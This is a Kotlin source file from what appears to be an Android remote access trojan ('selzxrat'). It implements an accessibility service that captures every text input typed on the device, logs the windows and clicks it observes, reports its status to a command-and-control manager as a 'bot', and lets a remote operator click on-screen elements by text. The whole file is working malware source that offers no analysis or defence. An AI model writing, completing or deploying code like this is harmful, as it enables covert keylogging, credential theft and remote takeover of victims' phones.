package com.selzxrat.v5.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.selzxrat.v5.C2Manager

class SELZXAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "SELZXAccessibility"
        var isConnected = false
            private set
        var lastKeyEvent: String = ""
            private set
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        isConnected = true
        Log.d(TAG, "Accessibility Service Connected")

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            notificationTimeout = 100

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            } else {
                @Suppress("DEPRECATION")
                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            }
        }

        serviceInfo = info

        // Update bot status
        C2Manager.sendCommand("self", "accessibility_status", "enabled")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.joinToString("") ?: ""
                if (text.isNotEmpty()) {
                    lastKeyEvent = text
                    Log.d(TAG, "Text input: $text")
                }
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val packageName = event.packageName?.toString() ?: ""
                val className = event.className?.toString() ?: ""
                Log.d(TAG, "Window: $packageName / $className")
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val nodeInfo = event.source
                val text = nodeInfo?.text?.toString() ?: ""
                Log.d(TAG, "Clicked: $text")
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility Service Interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        isConnected = false
        Log.d(TAG, "Accessibility Service Destroyed")
    }

    fun getRootNode(): AccessibilityNodeInfo? {
        return if (isConnected) rootInActiveWindow else null
    }

    fun performClickByText(text: String): Boolean {
        val root = rootInActiveWindow ?: return false
        return findAndClick(root, text)
    }

    private fun findAndClick(node: AccessibilityNodeInfo, targetText: String): Boolean {
        if (node.text?.toString()?.contains(targetText, ignoreCase = true) == true) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            return true
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null && findAndClick(child, targetText)) {
                child.recycle()
                return true
            }
            child?.recycle()
        }
        return false
    }
}
